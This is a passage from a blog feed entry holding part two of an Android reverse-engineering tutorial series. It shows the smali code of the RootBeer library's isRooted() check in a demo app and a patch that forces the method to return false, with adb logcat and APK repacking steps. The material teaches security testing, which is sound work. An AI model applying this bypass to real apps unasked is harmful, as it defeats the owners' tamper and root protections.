punctuation">,</span> <span class="token class-name">Landroid</span><span class="token operator">/</span>widget<span class="token operator">/</span><span class="token class-name">TextView</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">CharSequence</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">V</span><span class="token keyword">goto</span> <span class="token operator">:</span>goto_0<span class="token operator">:</span>cond_0<span class="token keyword">const</span><span class="token operator">-</span>string p1<span class="token punctuation">,</span> <span class="token string">"Safe, not rooted"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>After adding those three lines, save it, then repack it as mentioned in the previous article, install it on the phone, and check the log.</p><p>To view Android’s log, you need to use the <code>adb logcat</code> command. However, if you enter this command directly, a lot of logs will be displayed. Here are two useful commands.</p><p>The first is <code>adb logcat -c</code>, which clears the previous log. The second is:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb logcat <span class="token parameter variable">--pid</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>adb shell pidof <span class="token parameter variable">-s</span> com.cymetrics.demo<span class="token variable">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>This can display logs of the specified package name and exclude other noise, which is really useful.</p><p>After preparation, click the <code>CHECK ROOT</code> button in the app, and you will see a new log:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">01-25 09:32:06.528 <span class="token number">27651</span> <span class="token number">27651</span> E we are here: we are here<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>And the words <code>Safe, not rooted</code> on the screen, which means we have succeeded.</p><h2><span id="modifying-code-in-other-places">Modifying code in other places</span></h2><p>We just modified the code in the fragment, which is the logic of the program, and replaced the return value of <code>isRooted()</code> to always be false, bypassing the check.</p><p>But if there are other places in the program that will do similar checks, it will be troublesome because we must find every place that does the check and do similar things to change each one.</p><p>Therefore, a more efficient method is to directly modify the code of this third-party library to make <code>isRooted</code> always return false. This way, even if the app checks in multiple places, they will all be bypassed.</p><p>The code when calling the function is <code>Lcom/scottyab/rootbeer/RootBeer;-&gt;isRooted()</code>, so we can find this file by searching for <code>com/scottyab/rootbeer/RootBeer.smali</code> and searching for <code>isRooted</code> to find the code:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span>method <span class="token keyword">public</span> <span class="token function">isRooted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">Z</span>    <span class="token punctuation">.</span>locals <span class="token number">1</span>    <span class="token punctuation">.</span>line <span class="token number">44</span>    invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>p0<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>scottyab<span class="token operator">/</span>rootbeer<span class="token operator">/</span><span class="token class-name">RootBeer</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">detectRootManagementApps</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">Z</span>    move<span class="token operator">-</span>result v0    <span class="token keyword">if</span><span class="token operator">-</span>nez v0<span class="token punctuation">,</span> <span class="token operator">:</span>cond_1    invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>p0<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>scottyab<span class="token operator">/</span>rootbeer<span class="token operator">/</span><span class="token class-name">RootBeer</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">detectPotentiallyDangerousApps</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">Z</span>    move<span class="token operator">-</span>result v0    <span class="token keyword">if</span><span class="token operator">-</span>nez v0<span class="token punctuation">,</span> <span class="token operator">:</span>cond_1    <span class="token keyword">const</span><span class="token operator">-</span>string v0<span class="token punctuation">,</span> <span class="token string">"su"</span>    invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>p0<span class="token punctuation">,</span> v0<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>scottyab<span class="token operator">/</span>rootbeer<span class="token operator">/</span><span class="token class-name">RootBeer</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">checkForBinary</span><span class="token punctuation">(</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">String</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">Z</span>    move<span class="token operator">-</span>result v0    <span class="token keyword">if</span><span class="token operator">-</span>nez v0<span class="token punctuation">,</span> <span class="token operator">:</span>cond_1    <span class="token punctuation">.</span>line <span class="token number">45</span>    invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>p0<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>scottyab<span class="token operator">/</span>rootbeer<span class="token operator">/</span><span class="token class-name">RootBeer</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">checkForDangerousProps</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">Z</span>    move<span class="token operator">-</span>result v0    <span class="token keyword">if</span><span class="token operator">-</span>nez v0<span class="token punctuation">,</span> <span class="token operator">:</span>cond_1    invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>p0<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>scottyab<span class="token operator">/</span>rootbeer<span class="token operator">/</span><span class="token class-name">RootBeer</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">checkForRWPaths</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">Z</span>    move<span class="token operator">-</span>result v0    <span class="token keyword">if</span><span class="token operator">-</span>nez v0<span class="token punctuation">,</span> <span class="token operator">:</span>cond_1    <span class="token punctuation">.</span>line <span class="token number">46</span>    invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>p0<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>scottyab<span class="token operator">/</span>rootbeer<span class="token operator">/</span><span class="token class-name">RootBeer</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">detectTestKeys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">Z</span>    move<span class="token operator">-</span>result v0    <span class="token keyword">if</span><span class="token operator">-</span>nez v0<span class="token punctuation">,</span> <span class="token operator">:</span>cond_1    invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>p0<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>scottyab<span class="token operator">/</span>rootbeer<span class="token operator">/</span><span class="token class-name">RootBeer</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">checkSuExists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">Z</span>    move<span class="token operator">-</span>result v0    <span class="token keyword">if</span><span class="token operator">-</span>nez v0<span class="token punctuation">,</span> <span class="token operator">:</span>cond_1    invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>p0<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>scottyab<span class="token operator">/</span>rootbeer<span class="token operator">/</span><span class="token class-name">RootBeer</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">checkForRootNative</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">Z</span>    move<span class="token operator">-</span>result v0    <span class="token keyword">if</span><span class="token operator">-</span>nez v0<span class="token punctuation">,</span> <span class="token operator">:</span>cond_1    invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>p0<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>scottyab<span class="token operator">/</span>rootbeer<span class="token operator">/</span><span class="token class-name">RootBeer</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">checkForMagiskBinary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">Z</span>    move<span class="token operator">-</span>result v0    <span class="token keyword">if</span><span class="token operator">-</span>eqz v0<span class="token punctuation">,</span> <span class="token operator">:</span>cond_0    <span class="token keyword">goto</span> <span class="token operator">:</span>goto_0    <span class="token operator">:</span>cond_0    <span class="token keyword">const</span><span class="token operator">/</span><span class="token number">4</span> v0<span class="token punctuation">,</span> <span class="token number">0x0</span>    <span class="token keyword">goto</span> <span class="token operator">:</span>goto_1    <span class="token operator">:</span>cond_1    <span class="token operator">:</span>goto_0    <span class="token keyword">const</span><span class="token operator">/</span><span class="token number">4</span> v0<span class="token punctuation">,</span> <span class="token number">0x1</span>    <span class="token operator">:</span>goto_1    <span class="token keyword">return</span> v0<span class="token punctuation">.</span>end method<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Patching this function is very simple. We just make it always return false:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span>method <span class="token keyword">public</span> <span class="token function">isRooted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">Z</span>    <span class="token punctuation">.</span>locals <span class="token number">1</span>        # always returns <span class="token boolean">false</span>    <span class="token keyword">const</span><span class="token operator">/</span><span class="token number">4</span> v0<span class="token punctuation">,</span> <span class="token number">0x0</span>    <span class="token keyword">return</span> v0        # 以下省略<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>end method<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>After that, repack it and install it on the phone as before, and you will see the bypassed result.</p><h2><span id="summary">Summary</span></h2><p>In this article, we learned how to read basic smali code and modify it, and how to use <code>adb logcat</code> to view Android app logs. We also modified smali practically, reversed the original logic, and bypassed the root check of the app.</p><p>Adding logs is a method that I think seems stupid and inefficient, but it is very useful. It is like adding a lot of <code>console.log</code> when writing code with errors to confirm that the execution flow of the program matches our expectations, which is helpful for restoring logic.</p><p>Finally, I only briefly mentioned smali in this article. If you want to learn more about smali syntax, you can refer to the following articles:</p><ol><li><a href="https://www.jianshu.com/p/9931a1e77066">Android Reverse Basics: Smali Syntax</a></li><li><a href="https://blog.csdn.net/chenrunhua/article/details/41250613">APK Decompilation 1: Basic Knowledge-Smali File Reading</a></li></ol><p>In the next article, I will introduce how to monitor the requests and responses sent by the app to help us understand the communication between the app and the API server.</p><p>Series links:</p><ol><li><a href="/2023/04/27/en/android-apk-decompile-intro-1/">Android App Reverse Engineering Part 1: Decompiling and Rebuilding APKs</a></li><li><a href="/2023/04/27/en/android-apk-decompile-intro-2/">Android App Reverse Engineering Part 2: Modifying Smali Code</a> - You are here</li><li><a href="/2023/04/27/en/android-apk-decompile-intro-3/">Android App Reverse Engineering Part 3: Monitoring App Packets</a></li><li><a href="/2023/04/27/en/android-apk-decompile-intro-4/">Android App Reverse Engineering Part 4: Dynamic Analysis with Frida</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;In the first part, we learned the basics of using Apktool to decompile an APK, modify its resources, reassemble it, and install the aligned and signed APK on a device.&lt;/p&gt;
&lt;p&gt;In this part, we will learn how to modify the code.&lt;/p&gt;
&lt;p&gt;Our goal is to bypass the root detection check on a rooted device and make the app display that it is not rooted. If you are testing on a non-rooted device, you can do the opposite and modify the app to detect that you have root access.&lt;/p&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
</feed>
